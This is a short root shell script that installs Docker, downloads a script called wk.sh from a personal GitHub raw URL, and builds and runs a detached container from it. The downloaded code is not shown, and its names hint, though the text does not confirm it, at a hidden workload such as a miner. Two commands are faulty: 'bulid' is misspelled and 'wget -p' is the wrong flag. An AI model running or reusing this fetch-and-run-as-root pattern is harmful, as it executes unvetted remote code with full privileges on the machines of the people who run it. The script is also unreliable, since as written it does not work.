apt update -y
apt install docker.io -y
mkdir /root/kj
wget -p /root/kj https://raw.githubusercontent.com/6767881/obj/main/wk.sh
docker bulid -t kj /root/kj
docker run -d kj
